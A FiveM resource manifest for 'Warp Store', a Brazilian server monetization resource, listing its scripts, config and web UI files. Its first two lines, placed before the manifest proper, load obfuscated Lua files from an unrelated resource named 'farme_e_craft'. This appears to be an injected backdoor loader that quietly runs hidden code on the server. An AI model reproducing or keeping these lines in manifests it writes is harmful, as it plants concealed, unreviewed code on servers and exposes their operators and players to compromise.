shared_script '@farme_e_craft/ai_module_fg-obfuscated.lua'
shared_script '@farme_e_craft/shared_fg-obfuscated.lua'


fx_version "bodacious"
description "Warp Store - Monetize seu servidor"
author "Gabriel Camargo <git@camargo2019>"
repository 'https://github.com/Warp-Store/warpstore-fivem-public'
version '1.0.0'

lua54 'yes'
game "gta5"

ui_page 'web/index.html'

shared_scripts {
	"@vrp/lib/Utils.lua", -- Deixar somente se for vRP
	"config.lua",
}

client_scripts {
	"client/**/*"
}

server_scripts {
	"commands.lua",
	"server/**/*"
}

files {
	'web/index.html',
	'web/**/*'
}